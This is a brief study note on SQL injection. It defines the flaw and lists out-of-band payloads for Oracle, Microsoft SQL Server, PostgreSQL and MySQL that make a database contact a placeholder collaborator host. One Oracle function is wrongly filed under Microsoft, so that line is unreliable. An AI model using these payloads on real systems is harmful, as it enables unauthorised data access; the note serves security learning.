# SQL Injections (SQLi)

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.

## Cheatsheet

https://portswigger.net/web-security/sql-injection/cheat-sheet

### Out-of-band interactions

- Oracle
  - `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
- Microsoft
  - `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`
  - `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`
- PostgreSQL
  - `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`
- MySQL
  - `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`
  - `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`